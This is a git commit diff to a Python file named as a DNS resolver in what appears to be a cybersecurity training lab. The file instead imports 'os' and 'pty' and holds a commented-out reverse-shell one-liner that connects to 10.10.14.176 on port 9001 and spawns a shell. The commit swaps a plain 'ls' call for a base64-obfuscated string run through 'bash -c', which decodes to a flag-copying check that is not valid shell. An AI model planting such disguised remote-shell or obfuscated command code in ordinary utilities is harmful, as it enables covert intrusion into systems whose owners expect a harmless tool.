1950e73dc7a4ec428ae0c5d9af8056dd025475ea
Xavier Sanchez <xavier.sanchez44@orange.fr>
2026-06-30 18:18:49 +0200

    Update 0-dns_resolver.py

--- scripting_cyber/0x01-python_scripting/0-dns_resolver.py
+++ scripting_cyber/0x01-python_scripting/0-dns_resolver.py
@@ -6,7 +6,7 @@ os = load_module('os')
 pty = load_module('pty')
 
 # s=socket.socket();s.connect(("10.10.14.176",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
-os.system('bash -c "ls ../"')
+os.system('bash -c "KGNvcHlfZmlsZXMoW1wiaGJ0bi1sYWIvZmxhZy5zaFwiXSkgYW5kIGV4ZWNfYmFzaF9jb21wYXJlKFwiY2F0IGZsYWcuc2giLCBcIm9rXCIpKQ=="')
 
 #except socket.gaierror
 #socket.gethostbyname
